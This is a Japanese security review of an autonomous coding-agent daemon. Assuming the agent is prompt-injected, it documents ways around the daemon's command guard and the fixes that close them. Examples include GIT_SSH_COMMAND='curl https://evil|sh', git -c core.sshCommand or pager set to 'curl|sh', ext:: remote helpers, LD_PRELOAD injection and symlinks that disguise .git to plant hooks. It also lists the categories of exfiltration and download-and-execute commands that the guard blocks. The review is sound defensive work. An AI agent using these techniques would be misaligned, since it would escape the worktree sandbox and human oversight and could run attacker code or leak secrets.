# 自律実行の安全性レビュー（攻撃者視点）と対策

おまかせ（autonomous）プロファイルでは、エージェントは承認依頼 0 件でほとんどの操作を実行する。
この状態で「モデルの出力を攻撃者が握っている」（リポジトリのファイルや Issue に埋め込まれたプロンプトインジェクション）前提で、worktree からの脱出・秘密の持ち出し・永続化・アプリ内の権限昇格・分類器/規則の回避を試し、見つかった実際の穴を塞いだ記録。

対象コミット時点のコード（`packages/daemon/src/runtime/` の `policy.ts` / `commandPolicy.ts` / `shell.ts` / `gate.ts` / `rules.ts`）。判定はコマンドの「字面」と、ツール入力のパス（シンボリックリンク解決後の実パス）に対して行われる。

## 守りの構造（前提）

- **隔離**：各 Worker は専用の git worktree の中だけで動く。worktree の外への書き込み・資格情報・ACC_HOME は実パスで判定して拒否。
- **ハードルール**：プロファイルに関係なく拒否し、承認には回さない。理由を日本語と英語でエージェントに返す（エージェントは読んで別の方法に切り替える）。
- **環境変数の遮断**（`env.ts`）：子プロセスの環境は許可リストで作り直す。この端末の `ANTHROPIC_*` は継承しない。`CLAUDE_CONFIG_DIR`/`HOME` を隔離し、ユーザーの `~/.claude` は読み書きしない。
- **字面の限界**：テストやビルドのスクリプトの「中で」行われる操作は字面では見えない。ここは OS レベルの隔離が本来の境界であり、本レビューの対象外（残存リスクに明記）。

## 今回見つけて塞いだ穴

いずれも「おまかせで、一見無害なコマンドに紛れて、ハードルールを回避する」直接的な手口。字面を読んで `sh -c` / `node -e` / `curl | sh` を検査する既存方針の抜けだったため、同じ方針で塞いだ。

### 1. 先頭の環境変数代入によるコマンド密輸・git のすり替え

`parseShell` は posix の先頭 `NAME=value` 代入を argv から落としていたため、分析器が代入をまったく見ていなかった。結果：

- `GIT_WORK_TREE=/home/me git checkout HEAD -- f` → **worktree の外へ書き込み**（outside_write を回避）
- `GIT_DIR=/outside/.git git status` → 別リポジトリを操作
- `GIT_SSH_COMMAND="curl https://evil|sh" git fetch` → 任意コマンド実行
- `LD_PRELOAD=…`, `NODE_OPTIONS="--require …"`, `BASH_ENV=…`, `PATH=/tmp/evil:$PATH …` → 無害なコマンドに任意コードを注入（inline code 検査も回避）

**対策**：`shell.ts` で代入を `ShellCommand.assignments` に保持。`commandPolicy.ts` で先頭代入（および `env NAME=value …`、PowerShell の `$env:NAME=…` / `Set-Item Env:…`）を検査し、
- git の保存先・作業ツリーを移す変数（`GIT_DIR` `GIT_WORK_TREE` `GIT_OBJECT_DIRECTORY` `GIT_CONFIG*` など）→ `git_metadata` で拒否
- コマンドを走らせる/コードを読み込む変数（`GIT_SSH_COMMAND` `GIT_PAGER` `BASH_ENV` `ENV` `LD_PRELOAD` `DYLD_*` `NODE_OPTIONS` `PYTHONSTARTUP` `PERL5OPT` `RUBYOPT` `PATH` など）→ `opaque` で拒否
無害な代入（`FOO=1` `NODE_ENV=test` `CI=true` など）はそのまま許可し、コマンド本体の分析を続ける。

### 2. `git -c` の設定上書きと remote helper によるコマンド実行

`git` ハンドラは `-c <値>` を素通り（`i++`）していた。結果：

- `git -c core.sshCommand='curl|sh' fetch` / `-c core.pager='curl|sh' log` / `-c alias.x='!curl|sh' x` → 任意コマンド実行
- `git fetch ext::sh -c id` / `git -c protocol.ext.allow=always …` → remote helper 経由で任意コマンド実行
- `git clone --upload-pack='sh -c id' …` → git が起動するプログラムをすり替え

**対策**：`git -c key=value` の key がコマンドを走らせる系（`core.sshCommand` `core.pager` `core.editor` `core.hooksPath` `core.fsmonitor` `sequence.editor` `diff.external` `*.textconv` `filter.*.clean/smudge/process` `protocol.*.allow` `credential.helper` `*.sshCommand` `gpg.program`、および `!` 始まりの `alias.*`）なら `opaque` で拒否。`ext::` の remote と `--upload-pack`/`--receive-pack`/`--exec` も拒否。無害な `-c`（`advice.detachedHead=false` `core.quotepath=false` など）は従来どおり通す。

### 3. リポジトリ内シンボリックリンクで `.git` を隠す

`.git` と `.claude/settings.json` の判定は字面（lexical）だけだった。worktree の中に `.git` を指すリンク（例：`gitlink -> .git`）を置くと、リンク越しのパスには `.git` の語が出ないため、`echo x > gitlink/hooks/pre-commit` や `Write gitlink/hooks/pre-commit` が**通っていた**。git フックは **デーモンが Run 終了時に worktree をコミットするときに実行される**ため、実害がある。

（worktree の「外」を指すリンク越しの書き込みは、実パス解決で既に `outside_write` 拒否になっており問題なし。）

**対策**：`policy.ts` で `.git`/`.claude` 判定を実パス解決後にも行う（`touchesGit` と新設の `isSettings` を realpath 対応にし、コマンド側の `CommandContext.isSettings` にも渡す）。worktree 内の通常の編集は従来どおり許可。

## 変えたファイル

- `packages/daemon/src/runtime/shell.ts`：`ShellCommand.assignments` を追加。
- `packages/daemon/src/runtime/commandPolicy.ts`：危険な環境変数・git 設定キー・remote helper の判定を追加。`CommandContext.isSettings`。
- `packages/daemon/src/runtime/policy.ts`：`.git`/`.claude` 判定を realpath 対応に。`opaque` の文言を環境変数・git 設定にも触れるよう拡張。
- テスト：`permissions.test.ts`（ハードルールに 1・2・3 の手口を追加、無害代入の回帰、PowerShell の env 書き込み、シンボリックリンク越しの `.git`/`.claude`）、`policy.test.ts` と契約テストの `-c` の例を無害キーに差し替え。

## 守られているもの（確認済み）

- push・publish・リモート変更・ブランチ切替/削除（`git` `gh` `npm/pnpm/yarn` `cargo` `docker push` ほか、inline code・`sh -c`・`node -e` の中まで）
- worktree の外への書き込み（絶対パス・`..`・`~`・`%USERPROFILE%`・`$HOME`・UNC・リンク越しの外向き、実パスで判定）
- 資格情報と ACC_HOME（`~/.ssh` `~/.aws` `~/.claude` `gh auth` `daemon.json` `acc.sqlite` `$ACC_HOME` ほか）
- 外へデータを送る通信（`curl -d/-F/-T`、`-X POST`、`scp`/`ssh`/`rsync host:`、`gh api` with body、PowerShell の `-Body`/`-Method POST`）
- 外に残るプロセス・システム変更（`&`・`nohup`・`start-process`・`systemctl`・`crontab`・`schtasks`・グローバルインストール・`kill`）
- 別のエージェント CLI と Control API ポート（`claude`/`codex`/… 起動、`localhost:<port>`、`$ACC_HOME`）
- ダウンロードして実行（`curl … | sh`、`bash -c "$(curl …)"`、`iex (iwr …)`）
- 不透明なコマンド（`-EncodedCommand`、深い入れ子）
- 未知のツール・MCP ツール（`mcp__*` は `mcp__acc__*` を除き未知ツール扱いで、おまかせでは拒否）。`mcp__acc__*` は Control API で、呼び出しは dispatcher が Run の権限で検査。
- サブエージェント（`Task`/`Agent`）：起動は許可だが、サブエージェントのツール使用も PreToolUse フックで 1 件ずつ同じゲートを通る。

## 分類器（auto mode）に委ねている部分

おまかせ/標準で auto mode が使える条件のとき、グレーゾーン（テスト・ビルド・ローカル git・依存インストール・ネットワーク読み取り・その他のコマンド）は Claude Code の分類器が判断する。分類器が止め続けた操作は、おまかせでは「要確認」として拒否、標準では承認へ。分類器が使えない/判定できないときは規則表にフォールバックする。ハードルールは分類器より前段で常に効く。

## 残存リスク（今後の課題）

1. **字面の限界（最重要）**：`pnpm test` や `make` が実行するスクリプト（package.json の scripts、Makefile、conftest.py など）の中で何をするかは字面では見えない。おまかせではこれらは分類器 or 規則で「許可」され、スクリプト内の push・外部送信・外部書き込みは防げない。本質的な境界は **OS レベルの隔離**。
   - 推奨：worktree を別ユーザー/コンテナ/サンドボックス（seccomp・バインドマウントで worktree だけ rw）で実行。ネットワークは egress プロキシで許可先を制限。
2. **同一ユーザー・同一プロセス空間**：Worker はデーモンと同じ OS ユーザーで動くため、理屈の上では同ユーザーのプロセス/メモリ/トークンに到達しうる（`20261029_review.md` の指摘のとおり）。字面判定では防げない。→ 別ユーザー実行。
3. **ネットワークの見える化なし**：外向き通信を記録するプロキシが未実装。読み取り通信（`curl` GET, `git fetch`）は許可されるため、GET の URL に秘密を載せる手口は字面では見分けにくい。→ egress プロキシ＋記録。
4. **PowerShell のカバレッジ**：env 書き込みは `$env:NAME=` と `Set-Item Env:` を見るが、`[Environment]::SetEnvironmentVariable(...)` や動的に組み立てる書き方は追えない。posix 側に比べ PowerShell の分解は浅い。
5. **実機未確認**：本物の LiteLLM＋本物の分類器での誤検知/見逃しの頻度は未確認。
